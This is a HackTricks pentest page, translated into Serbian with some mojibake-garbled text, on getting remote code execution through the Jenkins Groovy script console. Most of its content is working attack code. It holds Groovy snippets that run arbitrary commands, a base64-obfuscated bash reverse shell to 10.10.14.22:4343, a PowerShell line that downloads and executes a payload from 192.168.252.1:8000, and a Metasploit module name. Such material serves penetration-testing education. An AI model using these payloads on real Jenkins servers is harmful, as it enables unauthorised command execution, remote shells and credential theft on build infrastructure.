# Jenkins RCE with Groovy Script

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Jenkins RCE with Groovy Script

Ovo je manje buƒçno nego kreiranje novog projekta u Jenkinsu

1. Idite na _path\_jenkins/script_
2. Unutar tekstualnog okvira unesite skriptu
```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```
Mo≈æete izvr≈°iti komandu koristeƒái: `cmd.exe /c dir`

U **linuxu** mo≈æete uraditi: **`"ls /".execute().text`**

Ako treba da koristite _navodnike_ i _jednostruke navodnike_ unutar teksta. Mo≈æete koristiti _"""PAYLOAD"""_ (trostruki dvostruki navodnici) da izvr≈°ite payload.

**Jo≈° jedan koristan groovy skript** je (zamenite \[INSERT COMMAND]):
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### Obrnuta ljuska u linuxu
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### –û–±—Ä–∞—Ç–Ω–∞ —ô—É—Å–∫–∞ —É –í–∏–Ω–¥–æ–≤—Å—É

–ú–æ–∂–µ—Ç–µ –ø—Ä–∏–ø—Ä–µ–º–∏—Ç–∏ HTTP —Å–µ—Ä–≤–µ—Ä —Å–∞ PS –æ–±—Ä–Ω—É—Ç–æ–º —ô—É—Å–∫–æ–º –∏ –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ Jeking –¥–∞ —ò–µ –ø—Ä–µ—É–∑–º–µ—Ç–µ –∏ –∏–∑–≤—Ä—à–∏—Ç–µ:
```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```
### Script

Mo≈æete automatizovati ovaj proces sa [**ovim skriptom**](https://github.com/gquere/pwn\_jenkins/blob/master/rce/jenkins\_rce\_admin\_script.py).

Mo≈æete koristiti MSF da dobijete reverznu ljusku:
```
msf> use exploit/multi/http/jenkins_script_console
```
{% hint style="success" %}
Uƒçite i ve≈æbajte AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Uƒçite i ve≈æbajte GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈æite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
